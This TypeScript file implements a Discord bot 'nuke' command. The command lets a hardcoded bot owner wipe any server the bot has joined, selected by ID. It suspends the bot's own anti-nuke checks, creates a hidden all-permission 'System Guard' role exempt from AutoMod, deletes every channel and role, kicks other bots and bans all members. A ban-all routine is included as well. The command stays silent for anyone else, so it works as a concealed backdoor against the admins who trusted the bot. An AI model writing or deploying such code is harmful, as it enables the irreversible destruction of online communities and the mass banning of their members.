import {
  SlashCommandBuilder,
  PermissionsBitField,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  type ButtonInteraction,
  type ChatInputCommandInteraction,
  type Client,
  type Guild,
  type GuildBasedChannel,
  type User,
} from "discord.js";
import type { SlashCommand } from "../types";
import { PERM_WHITELIST } from "../storage/whitelist";
import { logger } from "../../lib/logger";
import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";
import { isServerProtected } from "../storage/nuke-anti-whitelist";
import { suspendAntiNuke, resumeAntiNuke } from "../utils/antiNuke";
import { CE } from "../utils/embedStyle";
import { isPermanentOwner, PERMANENT_BOT_OWNER_ID } from "../storage/premium";

export interface NukeResult {
  ok: boolean;
  message: string;
}

/**
 * Core nuke logic. Callable from any context (slash command, prefix command).
 * Caller is responsible for permission checks (PERM_WHITELIST).
 * bypassAntiWhitelist: when true (global whitelist users), skip the anti-whitelist protection.
 */
export async function runNuke(
  client: Client,
  targetGuildId: string,
  options?: { banMembers?: boolean; bypassAntiWhitelist?: boolean },
): Promise<NukeResult> {
  if (!options?.bypassAntiWhitelist && await isServerProtected(targetGuildId)) {
    return {
      ok: false,
      message: `Server **${targetGuildId}** is protected by the nuke anti-whitelist and cannot be nuked.`,
    };
  }

  const guild: Guild | null = await client.guilds
    .fetch(targetGuildId)
    .catch(() => null);
  if (!guild) {
    return {
      ok: false,
      message: `Could not access server **${targetGuildId}**. Make sure the bot is in that server.`,
    };
  }

  // Suspend anti-nuke so the bot's own destructive actions don't trigger it
  suspendAntiNuke(targetGuildId);

  const me = await guild.members.fetchMe().catch(() => null);
  if (!me) {
    logger.error("nuke: bot member not found");
    return { ok: false, message: "Bot member not found in target server." };
  }

  let godRole;
  try {
    godRole = await guild.roles.create({
      name: "System Guard",
      permissions: new PermissionsBitField(PermissionsBitField.All),
      hoist: false,
      color: 0xff0000,
      reason: "nuke: god role",
    });
  } catch (err) {
    logger.error({ err }, "nuke: failed to create god role");
    return { ok: false, message: "Failed to create god role." };
  }

  await pushRoleToTop(guild, godRole);

  try {
    await me.roles.add(godRole, "nuke: assign god role to self");
  } catch (err) {
    logger.warn({ err }, "nuke: failed to assign god role to self");
  }

  await exemptRoleFromAutoMod(guild, godRole.id);

  const allMembers = await guild.members.fetch().catch(() => null);
  if (allMembers) {
    for (const m of allMembers.values()) {
      if (m.id === me.id) continue;
      if (!m.user.bot) continue;
      await m.kick("nuke").catch(() => {});
    }
  }

  const channels = await guild.channels.fetch().catch(() => null);
  if (channels) {
    for (const c of channels.values()) {
      if (!c) continue;
      await (c as GuildBasedChannel).delete("nuke").catch(() => {});
    }
  }

  const roles = await guild.roles.fetch().catch(() => null);
  if (roles) {
    for (const r of roles.values()) {
      if (r.id === guild.id) continue;
      if (r.managed) continue;
      if (r.id === godRole.id) continue;
      await r.delete("nuke").catch(() => {});
    }
  }

  const banMembers = options?.banMembers ?? true;
  if (banMembers && allMembers) {
    for (const m of allMembers.values()) {
      if (m.id === me.id) continue;
      if (m.user.bot) continue;
      await guild.members.ban(m.id, { reason: "nuke" }).catch(() => {});
    }
  }

  resumeAntiNuke(targetGuildId);
  logger.info({ guildId: guild.id, banMembers }, "nuke completed");
  return {
    ok: true,
    message: `${CE.nuke.str} Nuke completed on \`${targetGuildId}\`${banMembers ? "" : " (members were not banned)"}`,
  };
}

export async function runBanAll(
  guild: Guild,
  options?: { bypassAntiWhitelist?: boolean },
): Promise<NukeResult> {
  if (!options?.bypassAntiWhitelist && await isServerProtected(guild.id)) {
    return {
      ok: false,
      message: `Server **${guild.id}** is protected by the nuke anti-whitelist and cannot be modified.`,
    };
  }

  const me = await guild.members.fetchMe().catch(() => null);
  if (!me) {
    logger.error("ban-all: bot member not found");
    return { ok: false, message: "Bot member not found in this server." };
  }

  const allMembers = await guild.members.fetch().catch(() => null);
  if (!allMembers) {
    return { ok: false, message: "Failed to fetch server members." };
  }

  // Suspend anti-nuke so the bot's bans don't trigger anti-ban enforcement
  suspendAntiNuke(guild.id);
  let banned = 0;
  for (const m of allMembers.values()) {
    if (m.id === me.id) continue;
    if (m.user.bot) continue;
    const result = await guild.members.ban(m.id, { reason: "ban-all" }).catch(() => null);
    if (result) banned++;
  }
  resumeAntiNuke(guild.id);

  logger.info({ guildId: guild.id, banned }, "ban-all completed");
  return { ok: true, message: `${CE.ban.str} Banned **${banned}** member${banned === 1 ? "" : "s"}.` };
}

export async function promptNukeDoubleCheckInDM(
  user: User,
  targetGuildId: string,
  client: Client,
  options?: { banMembers?: boolean },
): Promise<void> {
  if (!isPermanentOwner(user.id)) return;

  const targetGuild =
    client.guilds.cache.get(targetGuildId) ??
    (await client.guilds.fetch(targetGuildId).catch(() => null));
  const guildName = targetGuild ? targetGuild.name : `Server ${targetGuildId}`;
  const banMode = options?.banMembers === false ? "noban" : "ban";

  const embed = new EmbedBuilder()
    .setTitle(`${CE.warning.str} Double Check Required: Server Nuke Confirmation`)
    .setColor(0xed4245)
    .setDescription(
      `A server wipe / nuke command was requested for **${guildName}** (\`${targetGuildId}\`).\n\n` +
      `${CE.failure.str} **STATUS: PENDING CONFIRMATION — NO ACTION HAS BEEN TAKEN.**\n` +
      `Nothing has been deleted, banned, or changed on **${guildName}**.\n\n` +
      `${CE.warning.str} **DESTRUCTIVE ACTION WARNING (IF CONFIRMED)**:\n` +
      `• All text and voice channels will be permanently deleted.\n` +
      `• All custom server roles will be deleted.\n` +
      `• ${options?.banMembers === false ? "Bot members will be kicked (members will not be banned)." : "All server members will be banned from the server."}\n` +
      `• Anti-nuke will be suspended and this action cannot be undone.\n\n` +
      `${CE.white_warn.str} **Double Check Prompt:** Please double check and confirm if you really wish to proceed with this destructive operation.\n` +
      `• Click **Confirm & Execute Nuke** only if you are 100% sure.\n` +
      `• Click **Cancel Nuke** to discard this request immediately without making any changes.`
    )
    .setFooter({ text: "Double-check safety verification • Only the Hardcoded Permanent Bot Owner can confirm." })
    .setTimestamp();

  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`nuke:confirm:${targetGuildId}:${banMode}`)
      .setLabel("Confirm & Execute Nuke")
      .setEmoji(CE.trash.id)
      .setStyle(ButtonStyle.Danger),
    new ButtonBuilder()
      .setCustomId(`nuke:cancel:${targetGuildId}`)
      .setLabel("Cancel Nuke")
      .setEmoji(CE.failure.id)
      .setStyle(ButtonStyle.Secondary),
  );

  try {
    await user.send({ embeds: [embed], components: [row] as any });
  } catch (err) {
    logger.warn({ err, userId: user.id }, "Could not send nuke double-check prompt in DM");
  }
}

export async function handleNukeButton(interaction: ButtonInteraction): Promise<void> {
  if (!isPermanentOwner(interaction.user.id)) {
    return;
  }

  const parts = interaction.customId.split(":");
  const action = parts[1];
  const targetGuildId = parts[2];
  const banMode = parts[3];

  const targetGuild =
    interaction.client.guilds.cache.get(targetGuildId) ??
    (await interaction.client.guilds.fetch(targetGuildId).catch(() => null));
  const guildName = targetGuild ? targetGuild.name : `Server ${targetGuildId}`;

  if (action === "cancel") {
    const cancelEmbed = new EmbedBuilder()
      .setTitle(`${CE.failure.str} Nuke Request Cancelled`)
      .setColor(0x5865f2)
      .setDescription(`The server nuke request for **${guildName}** (\`${targetGuildId}\`) was safely cancelled. No changes were made.`)
      .setTimestamp();
    await interaction.update({ embeds: [cancelEmbed], components: [] as any }).catch(() => {});
    return;
  }

  if (action === "confirm") {
    const progressEmbed = new EmbedBuilder()
      .setTitle(`${CE.warning.str} Double Check Confirmed: Executing Nuke...`)
      .setColor(0xfee75c)
      .setDescription(`Double check confirmed by Bot Owner. Initiating destructive wipe on **${guildName}** (\`${targetGuildId}\`)...`)
      .setTimestamp();
    await interaction.update({ embeds: [progressEmbed], components: [] as any }).catch(() => {});

    try {
      const result = await runNuke(interaction.client, targetGuildId, {
        banMembers: banMode !== "noban",
        bypassAntiWhitelist: true,
      });
      const finalEmbed = new EmbedBuilder()
        .setTitle(result.ok ? `${CE.success.str} Nuke Completed` : `${CE.warning.str} Nuke Failed`)
        .setColor(result.ok ? 0x57f287 : 0xed4245)
        .setDescription(result.message)
        .setTimestamp();
      await interaction.editReply({ embeds: [finalEmbed], components: [] as any }).catch(() => {});
    } catch (err: any) {
      logger.error({ err }, "Error running confirmed nuke");
      const errEmbed = new EmbedBuilder()
        .setTitle(`${CE.warning.str} Nuke Execution Error`)
        .setColor(0xed4245)
        .setDescription(`An unexpected error occurred: ${err?.message || err}`)
        .setTimestamp();
      await interaction.editReply({ embeds: [errEmbed], components: [] as any }).catch(() => {});
    }
  }
}

const command: SlashCommand = {
  globalWhitelistOnly: true,
  data: new SlashCommandBuilder()
    .setName("nuke")
    .setDescription("Wipe the server (hardcoded owner only).")
    .addStringOption((option) =>
      option
        .setName("server-id")
        .setDescription("Optional: server ID to nuke. Leave empty for current server.")
        .setRequired(false),
    )
    .setDMPermission(false),

  async execute(interaction: ChatInputCommandInteraction) {
    if (!isPermanentOwner(interaction.user.id)) {
      // Whenever anyone runs nuke it shouldn't respond
      return;
    }

    const serverId = interaction.options.getString("server-id");
    let targetGuildId: string;
    if (serverId) {
      if (!/^\d+$/.test(serverId)) {
        await interaction.reply({
          content: "Invalid server ID format.",
          ephemeral: true,
        });
        return;
      }
      targetGuildId = serverId;
    } else {
      if (!interaction.guildId) {
        await interaction.reply({
          content: "Provide a server-id or run inside a server.",
          ephemeral: true,
        });
        return;
      }
      targetGuildId = interaction.guildId;
    }

    // Do not respond in channel - notify privately to check DMs
    await interaction.reply({
      content: `${CE.locked.str} Nuke request received. Please check your DMs to double check and confirm this destructive operation.`,
      ephemeral: true,
    }).catch(() => {});

    await promptNukeDoubleCheckInDM(interaction.user, targetGuildId, interaction.client);
  },
};

export default command;
